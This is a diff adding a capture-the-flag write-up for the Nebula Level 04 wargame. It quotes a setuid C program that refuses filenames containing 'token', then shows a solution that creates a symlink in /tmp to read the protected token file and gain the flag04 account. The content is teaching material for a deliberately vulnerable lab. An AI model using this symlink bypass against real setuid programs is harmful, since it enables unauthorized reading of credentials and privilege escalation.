@@ -267,3 +267,71 @@ You have successfully executed getflag on a target account
 ## Ref
 1. [why setuid not work in /tmp](https://unix.stackexchange.com/questions/157314/suid-bit-not-working-for-executables-within-tmp-directory)
 2. [check nosuid flag](https://unix.stackexchange.com/questions/91068/how-to-check-if-a-partition-is-mounted-as-noexec)
+
+# Level 04
+## Description
+
+Link [https://exploit.education/nebula/level-04/](https://exploit.education/nebula/level-04/)
+```
+This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)
+
+To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.
+```
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char buf[1024];
+  int fd, rc;
+
+  if(argc == 1) {
+      printf("%s [file to read]\n", argv[0]);
+      exit(EXIT_FAILURE);
+  }
+
+  if(strstr(argv[1], "token") != NULL) {
+      printf("You may not access '%s'\n", argv[1]);
+      exit(EXIT_FAILURE);
+  }
+
+  fd = open(argv[1], O_RDONLY);
+  if(fd == -1) {
+      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+  }
+
+  rc = read(fd, buf, sizeof(buf));
+  
+  if(rc == -1) {
+      err(EXIT_FAILURE, "Unable to read fd %d", fd);
+  }
+
+  write(1, buf, rc);
+}
+```
+
+## Analyse
+1. From the code, we can see that we can not pass the argument which contains string `token`. But what if we create a link to the `token` file with another name? This should bypass the check.
+
+
+## Solution
+```bash
+level04@nebula:/home/flag04$ ln -sf /home/flag04/token /tmp/testme
+level04@nebula:/home/flag04$ ./flag04 /tmp/testme
+06508b5e-8909-4f38-b630-fdb148a848a2
+level04@nebula:/home/flag04$ su flag04
+Password: 
+sh-4.2$ id
+uid=995(flag04) gid=995(flag04) groups=995(flag04)
+sh-4.2$ getflag
+You have successfully executed getflag on a target account
+```
+
+## After thought
+1. Check only the file name is not suffisant if some files are restricted.
